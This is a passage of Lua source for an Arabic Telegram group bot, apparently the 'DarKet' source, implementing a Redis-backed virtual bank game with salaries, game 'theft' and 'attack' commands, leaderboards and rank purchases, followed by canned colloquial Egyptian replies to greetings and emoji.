if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
send(msg.chat_id,msg.id,"\n*•  داركت ماعنده حساب بالبنك 🤣*","md",true)  
return false
end
local ban = LuaTele.getUser(Remsg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
if Redis:sismember(darket.."booob",Remsg.sender.user_id) then
Redis:incrby(darket.."boob"..Remsg.sender.user_id , coniss)
ccccc = Redis:get(darket.."boobb"..Remsg.sender.user_id)
uuuuu = Redis:get(darket.."bbobb"..Remsg.sender.user_id)
ppppp = Redis:get(darket.."zrfff"..Remsg.sender.user_id) or 0
ballanceed = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
send(msg.chat_id,msg.id, "•  الاسم ↢ "..news.."\n•  الحساب ↢ `"..ccccc.."`\n•  بنك ↢ ( داركت )\n•  نوع ↢ ( "..uuuuu.." )\n•  الزرف ↢ ( "..ppppp.." جنيه 💵 )\n•  صار رصيده ↢ ( "..ballanceed.." جنيه 💵 )\n✦","md",true)
else
send(msg.chat_id,msg.id, "•  ماعنده حساب بنكي ","md",true)
end
end
end
if text and text:match("^خصم فلوس (.*)$") and msg.reply_to_message_id ~= 0 then
local UserName = text:match('^خصم فلوس (.*)$')
local coniss = tostring(UserName)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
if msg.ControllerBot then
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
send(msg.chat_id,msg.id,"\n*•  داركت ماعنده حساب بالبنك 🤣*","md",true)  
return false
end
local ban = LuaTele.getUser(Remsg.sender.user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
if Redis:sismember(darket.."booob",Remsg.sender.user_id) then
Redis:decrby(darket.."boob"..Remsg.sender.user_id , coniss)
ccccc = Redis:get(darket.."boobb"..Remsg.sender.user_id)
uuuuu = Redis:get(darket.."bbobb"..Remsg.sender.user_id)
ppppp = Redis:get(darket.."zrfff"..Remsg.sender.user_id) or 0
ballanceed = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
send(msg.chat_id,msg.id, "•  الاسم ↢ "..news.."\n•  الحساب ↢ `"..ccccc.."`\n•  بنك ↢ ( داركت )\n•  نوع ↢ ( "..uuuuu.." )\n•  الزرف ↢ ( "..ppppp.." جنيه 💵 )\n•  صار رصيده ↢ ( "..ballanceed.." جنيه 💵 )\n✦","md",true)
else
send(msg.chat_id,msg.id, "•  ماعنده حساب بنكي ","md",true)
end
end
end
if text == "توب فلوس" or text == "توب الفلوس" then
local bank_users = Redis:smembers(darket.."booob")
if #bank_users == 0 then
return send(msg.chat_id,msg.id,"•  لا يوجد حسابات في البنك","md",true)
end
top_mony = "توب اغنى 10 شخص في البوت :\n\n"
mony_list = {}
for k,v in pairs(bank_users) do
local mony = Redis:get(darket.."boob"..v)
table.insert(mony_list, {tonumber(mony) , v})
end
table.sort(mony_list, function(a, b) return a[1] > b[1] end)
num = 1
emoji ={ 
"🥇" ,
"🥈",
"🥉",
"4",
"5",
"6",
"7",
"8",
"9",
"10"
}
for k,v in pairs(mony_list) do
if num <= 10 then
local user_name = LuaTele.getUser(v[2]).first_name
if user_name then
nname = user_name
else
nname = ""
end
local user_tag = '['..nname..'](tg://user?id='..v[2]..')'
local mony = v[1]
local emo = emoji[k]
num = num + 1
top_mony = top_mony.."*"..emo.."*) *"..mony.."* 💰 l ["..nname.."] \n"
end
end
return send(msg.chat_id,msg.id,top_mony,"md")
end

if text == "توب الحراميه" or text == "توب الحرامية" or text == "توب حراميه" or text == "توب الزرف" or text == "توب زرف" then
local ty_users = Redis:smembers(darket.."zrfffid")
if #ty_users == 0 then
return send(msg.chat_id,msg.id,"•  لا يوجد احد","md",true)
end
ty_anubis = "توب 10 اشخاص زرفوا فلوس :\n\n"
ty_list = {}
for k,v in pairs(ty_users) do
local mony = Redis:get(darket.."zrfff"..v)
table.insert(ty_list, {tonumber(mony) , v})
end
table.sort(ty_list, function(a, b) return a[1] > b[1] end)
num_ty = 1
emojii ={ 
"🥇" ,
"🥈",
"🥉",
"4",
"5",
"6",
"7",
"8",
"9",
"10"
}
for k,v in pairs(ty_list) do
if num_ty <= 10 then
local user_name = LuaTele.getUser(v[2]).first_name
if user_name then
nname = user_name
else
nname = ""
end
local user_tag = '['..nname..'](tg://user?id='..v[2]..')'
local mony = v[1]
local emoo = emojii[k]
num_ty = num_ty + 1
ty_anubis = ty_anubis.."*"..emoo.."*) *"..mony.."* 💵 l ["..nname.."] \n"
end
end
return send(msg.chat_id,msg.id,ty_anubis,"md")
end

if text == 'بخشيش' or text == 'بقشيش' then
if Redis:sismember(darket.."booob",msg.sender.user_id) then
if Redis:get(darket.."iioo" .. msg.sender.user_id) then
local time_ex = ctime(Redis:ttl(darket.."iioo" .. msg.sender.user_id))
return send(msg.chat_id,msg.id,"•  من شوي اخذت بخشيش استنى ( "..time_ex.." )","md",true)
end
local jjjo = math.random(1,200);
Redis:incrby(darket.."boob"..msg.sender.user_id , jjjo)
send(msg.chat_id,msg.id,"•  تكرم وهي بخشيش "..jjjo.." جنيه 💵","md",true)
Redis:setex(darket.."iioo" .. msg.sender.user_id,600, true)
else
send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end


if text == 'زرف' or text == "سرقه" or text == 'زرفو' or text == 'زرفه' and tonumber(msg.reply_to_message_id) ~= 0 then
if not Redis:sismember(darket.."booob",msg.sender.user_id) then
return send(msg.chat_id,msg.id,"• ما عندك حساب بنكي")
end
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.Merotele == "userTypeBot" then
send(msg.chat_id,msg.id,"\n*• البوت ماعنده حساب بالبنك *","md",true)  
return false
end
if Remsg.sender.user_id == msg.sender.user_id then
send(msg.chat_id,msg.id,"\n*•  بدك تزرف نفسك 🤡*","md",true)  
return false
end
if Redis:get(darket.."polic" .. msg.sender.user_id) then
local time_ex = ctime(Redis:ttl(darket.."polic" .. msg.sender.user_id))
return send(msg.chat_id,msg.id,"•  انتا بالسجن 🏤 استنى ( "..time_ex.." )","md",true)
end
if Redis:get(darket.."hrame" .. Remsg.sender.user_id) then
local time_ex = ctime(Redis:ttl(darket.."hrame" .. Remsg.sender.user_id))
return send(msg.chat_id,msg.id,"•  ذا المسكين مزروف قبل شوي\n•  يمديك تزرفه بعد ( "..time_ex.." )","md",true)
end
if Redis:sismember(darket.."booob",Remsg.sender.user_id) then
ballanceed = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
if tonumber(ballanceed) < 199 then
return send(msg.chat_id,msg.id, "•  مايمديك تزرفه فلوسه اقل من 200 جنيه 💵","md",true)
end
local hrame = math.floor(math.random() * 200) + 1;
local hramee = math.floor(math.random() * 5) + 1;
if hramee == 1 or hramee == 2 or hramee == 3 or hramee == 4 then
local ballanceed = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
Redis:incrby(darket.."boob"..msg.sender.user_id , hrame)
Redis:decrby(darket.."boob"..Remsg.sender.user_id , hrame)
Redis:setex(darket.."hrame" .. Remsg.sender.user_id,900, true)
Redis:incrby(darket.."zrfff"..msg.sender.user_id,hrame)
Redis:sadd(darket.."zrfffid",msg.sender.user_id)
send(msg.chat_id,msg.id, "•  خذ يالحرامي زرفته "..hrame.." جنيه 💵\n✦","md",true)
else
Redis:setex(darket.."polic" .. msg.sender.user_id,300, true)
send(msg.chat_id,msg.id, "•  مسكتك الشرطة وانتا تزرف 🚔\n✦","md",true)
end
else
send(msg.chat_id,msg.id, "•  ماعنده حساب بنكي ","md",true)
end
end

if text == 'راتب' or text == 'راتبي' then
if Redis:sismember(darket.."booob",msg.sender.user_id) then
if Redis:get(darket.."iiioo" .. msg.sender.user_id) then
local time_ex = ctime(Redis:ttl(darket.."iiioo" .. msg.sender.user_id))
return send(msg.chat_id,msg.id,"•  راتبك بينزل بعد ( "..time_ex.." )","md",true)
end
local ban = LuaTele.getUser(msg.sender.user_id)
if ban.first_name then
neews = "["..ban.first_name.."](tg://user?id="..ban.id..")"
else
neews = " لا يوجد "
end
local jobs = {"طيار","محامي","دكتور","خباز","مدير بنك","قلب ستيفن","مدرس","فتاحه"}
local job = jobs[math.random(#jobs)]
if job == "طيار" then
Redis:incrby(darket.."boob"..msg.sender.user_id , 500)
ratbk = "500"
your_job = "طيار 🚀"
elseif job == "محامي" then
Redis:incrby(darket.."boob"..msg.sender.user_id , 300)
ratbk = "300"
your_job = "محامي 👨‍🎓"
elseif job == "دكتور" then
Redis:incrby(darket.."boob"..msg.sender.user_id , 600)
ratbk = "600"
your_job = "دكتور 👨‍🔬‍"
elseif job == "خباز" then
Redis:incrby(darket.."boob"..msg.sender.user_id , 100)
ratbk = "100"
your_job = "خباز ‍💆‍♂️"
elseif job == "مدير بنك" then
Redis:incrby(darket.."boob"..msg.sender.user_id , 800)
ratbk = "800"
your_job = "مدير بنك ‍👨‍💼"
elseif job == "قلب ستيفن" then
Redis:incrby(darket.."boob"..msg.sender.user_id , 1000)
ratbk = "1000"
your_job = "قلب ستيفن ♥"
elseif job == "مدرس" then
Redis:incrby(darket.."boob"..msg.sender.user_id , 400)
ratbk = "400"
your_job = "مدرس 🤵"
elseif job == "فتاحه" then
Redis:incrby(darket.."boob"..msg.sender.user_id , 5000)
ratbk = "5000"
your_job = "فتاحه 💋"
end
local ballancee = Redis:get(darket.."boob"..msg.sender.user_id) or 0
send(msg.chat_id,msg.id,"• اشعار ايداع "..neews.."\n• وظيفتك : "..your_job.."\n• المبلغ : "..ratbk.." جنيه 💵\n• نوع العملية : اضافة راتب\n• رصيدك الحين : "..ballancee.." جنيه 💵","md",true)
Redis:setex(darket.."iiioo" .. msg.sender.user_id,600, true)
else
send(msg.chat_id,msg.id, "•  ماعندك حساب بنكي ارسل ↢ ( `انشاء حساب بنكي` )","md",true)
end
end
if text and text:match("^هجوم (.*)$") then
if tonumber(msg.reply_to_message_id) == 0 then
return send(msg.chat_id,msg.id, "• استخدم الامر بالرد علي الاعضاء")
end
if not Redis:sismember(darket.."booob",msg.sender.user_id) then
return send(msg.chat_id,msg.id,"• ما عندك حساب بنكي")
end
local Remsg = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Remsg.sender.user_id)
if UserInfo and UserInfo.type and UserInfo.type.Merotele == "userTypeBot" then
send(msg.chat_id,msg.id,"\n*• البوت ماعنده حساب بالبنك *","md",true)  
return false
end
if Remsg.sender.user_id == msg.sender.user_id then
send(msg.chat_id,msg.id,"\n*• ما ينفع تهاجم نفسك*","md",true)  
return false
end
if not Redis:sismember(darket.."booob",Remsg.sender.user_id) then
return send(msg.chat_id,msg.id,"• ما عنده حساب بنكي")
end
if Redis:get(darket..'hgomm'..msg.sender.user_id) then
return send(msg.chat_id,msg.id,"• استنا "..ctime(Redis:ttl(darket..'hgomm'..msg.sender.user_id)).." وبعدين هاجم تاني")
end

local num = text:match('^هجوم (.*)$')
local coniss = tostring(num)
local coniss = coniss:gsub('٠','0')
local coniss = coniss:gsub('١','1')
local coniss = coniss:gsub('٢','2')
local coniss = coniss:gsub('٣','3')
local coniss = coniss:gsub('٤','4')
local coniss = coniss:gsub('٥','5')
local coniss = coniss:gsub('٦','6')
local coniss = coniss:gsub('٧','7')
local coniss = coniss:gsub('٨','8')
local coniss = coniss:gsub('٩','9')
local coniss = coniss:gsub('-','')
local coniss = tonumber(coniss)
local my_balance = Redis:get(darket.."boob"..msg.sender.user_id) or 0
local his_balance = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
if tonumber(my_balance) < coniss then
return send(msg.chat_id,msg.id, "• فلوسك اقل من هذا المبلغ")
end
if tonumber(his_balance) < coniss then
return send(msg.chat_id,msg.id, "• فلوسه اقل من هذا المبلغ")
end
local rand = math.random(1,10)
if tonumber(rand) < 5 then
Redis:incrby(darket.."boob"..msg.sender.user_id , coniss)
Redis:decrby(darket.."boob"..Remsg.sender.user_id , coniss)
local balance = Redis:get(darket.."boob"..msg.sender.user_id) or 0
local Hbalance = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
Redis:setex(darket..'hgomm'..msg.sender.user_id,300,true)
return send(msg.chat_id,msg.id, "• نجحت في الهجوم وسرقت منه "..coniss.."\n• اصبح رصيدك الان "..balance.."\n• اصبح رصيده هو "..Hbalance)
else
Redis:incrby(darket.."boob"..Remsg.sender.user_id , coniss)
Redis:decrby(darket.."boob"..msg.sender.user_id , coniss)
local balance = Redis:get(darket.."boob"..msg.sender.user_id) or 0
local Hbalance = Redis:get(darket.."boob"..Remsg.sender.user_id) or 0
Redis:setex(darket..'hgomm'..msg.sender.user_id,300,true)
return send(msg.chat_id,msg.id, "• فشلت في الهجوم عليه وخصم منك "..coniss.."\n• اصبح رصيدك الان "..balance.."\n• اصبح رصيده هو "..Hbalance)
end
end


if text and Redis:get(darket..msg.chat_id..msg.sender.user_id.."txtrtb") then
local balance = Redis:get(darket.."boob"..msg.sender.user_id)
if text == 'مميز' and tonumber(balance)  >= 2000 then
Redis:decrby(darket.."boob"..msg.sender.user_id , 2000)
Redis:sadd(darket.."Special:Group"..msg_chat_id,msg.sender.user_id) 
Redis:del(darket..msg.chat_id..msg.sender.user_id.."txtrtb") 
return send(msg.chat_id,msg.id,"• تم رفعك مميز بنجاح وخصم 3000 جنيه من فلوسك")
elseif text == "ادمن" and tonumber(balance)  >= 4000 then
Redis:decrby(darket.."boob"..msg.sender.user_id , 4000)
Redis:sadd(darket.."Admin:Group"..msg_chat_id,msg.sender.user_id) 
Redis:del(darket..msg.chat_id..msg.sender.user_id.."txtrtb") 
return send(msg.chat_id,msg.id,"• تم رفعك ادمن بنجاح وخصم 4000 جنيه من فلوسك")
elseif text == "مدير" and tonumber(balance)  >= 6000 then
Redis:decrby(darket.."boob"..msg.sender.user_id , 6000)
Redis:sadd(darket.."Manger:Group"..msg_chat_id,msg.sender.user_id) 
Redis:del(darket..msg.chat_id..msg.sender.user_id.."txtrtb") 
return send(msg.chat_id,msg.id,"• تم رفعك مدير بنجاح وخصم 6000 جنيه من فلوسك")
elseif text == "منشئ" and tonumber(balance)  >= 8000 then 
Redis:decrby(darket.."boob"..msg.sender.user_id , 8000)
Redis:sadd(darket.."Creator:Group"..msg_chat_id,msg.sender.user_id) 
Redis:del(darket..msg.chat_id..msg.sender.user_id.."txtrtb") 
return send(msg.chat_id,msg.id,"• تم رفعك منشئ بنجاح وخصم 8000 جنيه من فلوسك")
end
end
if text == "شراء رتبه" then
if not Redis:sismember(darket.."booob",msg.sender.user_id) then
return send(msg.chat_id,msg.id,"• ما عندك حساب بنكي \n• ارسل `انشاء حساب بنكي`","md")
end
local balance = Redis:get(darket.."boob"..msg.sender.user_id)
if tonumber(balance) == tonumber(0) then
return send(msg.chat_id,msg.id,"• ما عندك اي فلوس تشتري بيها")
end
if tonumber(balance) < 2000 then
return send(msg.chat_id,msg.id,"• فلوسك لا تكفي لشراء اي رتبه")
end
if tonumber(balance)  >= 2000 and tonumber(balance) < 4000 then
Txtrtb = "• الرتب اللتي يمكنك شرائها هي \n\n• `مميز` (2000 جنيه) \n\n • اضغط علي الرتبه ليتم نسخها"
elseif tonumber(balance) >= 4000 and tonumber(balance) < 6000 then
Txtrtb = "• الرتب اللتي يمكنك شرائها هي \n\n• `مميز` (2000 جنيه)\n• `ادمن` (4000 جنيه) \n\n • اضغط علي الرتبه ليتم نسخها"
elseif tonumber(balance) >= 6000 and tonumber(balance) < 8000 then
Txtrtb = "• الرتب اللتي يمكنك شرائها هي \n\n• `مميز` (2000 جنيه)\n• `ادمن` (4000 جنيه) \n• `مدير` (6000 جنيه)\n\n • اضغط علي الرتبه ليتم نسخها"
elseif tonumber(balance) >= 8000 then
Txtrtb = "• الرتب اللتي يمكنك شرائها هي \n\n• `مميز` (2000 جنيه)\n• `ادمن` (4000 جنيه) \n• `مدير` (6000 جنيه)\n• `منشئ` (8000 جنيه)\n\n • اضغط علي الرتبه ليتم نسخها"
end
Redis:setex(darket..msg.chat_id..msg.sender.user_id.."txtrtb",180,true)
return send(msg.chat_id,msg.id,Txtrtb,"md")
end
----
if text == 'تفعيل ردود السورس' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:set(darket..'rdod:sh'..msg.chat_id,true)
send(msg_chat_id,msg_id,'\n*٠ تم تفعيل ردود السورس * ',"md",true)  
end
if text == 'تعطيل ردود السورس' then
if not msg.Manger then
return send(msg_chat_id,msg_id,'\n*٠ هذا الامر يخص  '..Controller_Num(6)..' * ',"md",true)  
end
Redis:del(darket..'rdod:sh'..msg.chat_id)
send(msg_chat_id,msg_id,'\n*٠ تم تعطيل ردود السورس * ',"md",true)  
end
if Redis:get(darket..'rdod:sh'..msg.chat_id) then
if text == 'هاي' or text == 'هيي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*هآي تع اشب شااي • 😹💔*',"md",false, false, false, false, reply_markup)
end
if text == 'سلام عليكم' or text == 'السلام عليكم' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*وعليكم السلام 🌝💜*',"md",false, false, false, false, reply_markup)
end
if text == 'سلام' or text == 'مع سلامه' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*مع الف سلامه يقلبي متجيش تاني 😹💔🎶*',"md",false, false, false, false, reply_markup)
end
if text == 'برايفت' or text == 'تع برايفت' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*خدوني معاكم برايفت والنبي 🥺💔*',"md",false, false, false, false, reply_markup)
end
if text == 'النبي' or text == 'صلي علي النبي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*عليه الصلاه والسلام 🌝💛*',"md",false, false, false, false, reply_markup)
end
if text == 'نعم' or text == 'يا نعم' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*نعم الله عليك 🌚❤️*',"md",false, false, false, false, reply_markup)
end
if text == '🙄' or text == '🙄🙄' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'* نزل عينك تحت كدا علشان هتخاد علي قفاك 😒❤️*',"md",false, false, false, false, reply_markup)
end
if text == '🙄' or text == '🙄🙄' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'TeAm DarKet', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*نزل عينك تحت كدا علشان هتخاد علي قفاك 😒❤️*',"md",false, false, false, false, reply_markup)
end
if text == '😂' or text == '😂😂' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*ضحكتك عثل زيكك ينوحيي 🌝❤️*',"md",false, false, false, false, reply_markup)
end
if text == '😹' or text == '😹' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*ضحكتك عثل زيكك ينوحيي 🌝❤️*',"md",false, false, false, false, reply_markup)
end
if text == '🤔' or text == '🤔🤔' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'* بتفكر في اي 🤔*',"md",false, false, false, false, reply_markup)
end
if text == '🌚' or text == '🌝' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*القمر ده شبهك 🙂❤️*',"md",false, false, false, false, reply_markup)
end
if text == '😭' or text == '😭😭' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*بتعيط تيب لي طيب 😥*',"md",false, false, false, false, reply_markup)
end
if text == '🥺' or text == '🥺🥺' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*متزعلش بحبك 😻🤍*',"md",false, false, false, false, reply_markup)
end
if text == '😒' or text == '😒😒' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*عدل وشك ونت بتكلمني 😒🙄*',"md",false, false, false, false, reply_markup)
end
if text == 'بحبك' or text == 'حبق' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*وانا كمان بعشقك يا روحي 🤗🥰*',"md",false, false, false, false, reply_markup)
end

if text == 'هلا' or text == 'هلا وغلا' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*هلا بيك ياروحي 👋*',"md",false, false, false, false, reply_markup)
end
if text == 'هشش' or text == 'هششخرص' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*بنهش كتاكيت احنا هنا ولا اي ??😹*',"md",false, false, false, false, reply_markup)
end
if text == 'الحمد الله' or text == 'بخير الحمد الله' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*دايما ياحبيبي 🌝❤️*',"md",false, false, false, false, reply_markup)
end
if text == 'بف' or text == 'بص بف' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*وحيات امك ياكبتن خدوني معاكو بيف 🥺💔*',"md",false, false, false, false, reply_markup)
end
if text == 'خاص' or text == 'بص خاص' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*ونجيب اشخاص 😂👻*',"md",false, false, false, false, reply_markup)
end
if text == 'صباح الخير' or text == 'مساء الخير' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*انت الخير يعمري 🌝❤️*',"md",false, false, false, false, reply_markup)
end
if text == 'صباح النور' or text == 'باح الخير' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*صباح العسل 😻🤍*',"md",false, false, false, false, reply_markup)
end
if text == 'حصل' or text == 'حثل' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*خخخ امال 😹*',"md",false, false, false, false, reply_markup)
end
if text == 'اه' or text == 'اها' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*اه اي يا قدع عيب 😹💔*',"md",false, false, false, false, reply_markup)
end
if text == 'كسم' or text == 'كسمك' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*عيب ياوسخ 🙄💔*',"md",false, false, false, false, reply_markup)
end
if text == 'بوتي' or text == 'يا بوتي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'روح وعقل بوتك 🥺💔',"md",false, false, false, false, reply_markup)
end
if text == 'متيجي' or text == 'تع' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*لا عيب بتكسف 😹💔*',"md",false, false, false, false, reply_markup)
end
if text == 'هيح' or text == 'لسه صاحي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*صح النوم 😹💔*',"md",false, false, false, false, reply_markup)
end
if text == 'منور' or text == 'نورت' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'TeAm DarKet', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*ده نورك ي قلبي 🌝💙*',"md",false, false, false, false, reply_markup)
end
if text == 'باي' or text == 'انا ماشي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*ع فين لوين رايح وسايبنى 🥺💔*',"md",false, false, false, false, reply_markup)
end
if text == 'ويت' or text == 'ويت يحب' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*اي الثقافه دي 😒😹*',"md",false, false, false, false, reply_markup)
end
if text == 'خخخ' or text == 'خخخخخ' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*اهدا يوحش ميصحش كدا 😒??*',"md",false, false, false, false, reply_markup)
end
if text == 'شكرا' or text == 'مرسي' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*العفو ياروحي 🙈🌝*',"md",false, false, false, false, reply_markup)
end
if text == 'حلوه' or text == 'حلو' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*انت الي حلو ياقمر 🤤🌝*',"md",false, false, false, false, reply_markup)
end
if text == 'بموت' or text == 'هموت' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*موت بعيد م ناقصين مصايب 😑😂*',"md",false, false, false, false, reply_markup)
end
if text == 'اي' or text == 'ايه' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*جتك اوهه م سامع ولا ايي 😹👻*',"md",false, false, false, false, reply_markup)
end
if text == 'طيب' or text == 'تيب' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*فرح خالتك قريب 😹💋💃🏻*',"md",false, false, false, false, reply_markup)
end
if text == 'حاضر' or text == 'حتر' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
}
}
return send(msg_chat_id,msg_id,'*حضرلك الخير يارب 🙂❤️*',"md",false, false, false, false, reply_markup)
end
if text == 'جيت' or text == 'انا جيت' then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/R125R'}, 
},
